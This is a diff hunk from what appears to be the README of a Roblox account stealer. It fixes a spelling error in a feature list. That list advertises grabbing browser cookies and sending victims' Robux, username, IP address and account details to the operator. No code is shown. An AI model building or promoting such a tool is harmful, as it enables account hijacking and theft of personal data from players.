@@ -8,7 +8,7 @@
 
 Tutorial: It should be easy, I am not explaining to skids who can't even understand Python.
 
-# Feautres
+# Features
 	🟢Grabs Cookie from Edge, Opera (GX), Chrome, etc.
 	🟢Sends Robux, Premium Status, Username, IP Address, RAP, Creation Date & Age
 	🟢Sends multiple cookie-results if multiple are found between different browsers.
